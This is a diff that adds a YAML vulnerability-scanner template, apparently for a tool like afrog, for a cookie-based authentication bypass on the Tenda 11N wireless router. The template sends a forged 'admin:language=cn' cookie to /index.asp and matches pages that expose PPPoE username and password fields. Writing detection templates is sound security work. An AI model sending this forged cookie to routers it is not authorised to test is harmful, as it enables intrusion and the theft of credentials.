@@ -1,0 +1,21 @@
+id: tenda-11n-cookie-unauth-access
+
+info:
+  name: Tenda 11N无线路由器 Cookie 越权访问漏洞
+  author: zan8in
+  severity: high
+  description: |
+    Tenda 11N无线路由器由于只验证Cookie，导致任意用户伪造Cookie即可进入后台
+    app="TENDA-11N无线路由器"
+  reference:
+    - http://wiki.peiqi.tech/wiki/iot/Tenda/Tenda%2011N%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8%20Cookie%20%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.html
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /index.asp
+      headers:
+        Cookie: admin:language=cn
+    expression: response.status == 200 && response.body.bcontains(b'<title>TENDA') && response.body.bcontains(b'def_PUN') && response.body.bcontains(b'def_PPW') && response.body.bcontains(b'def_WANT')
+expression: r0()
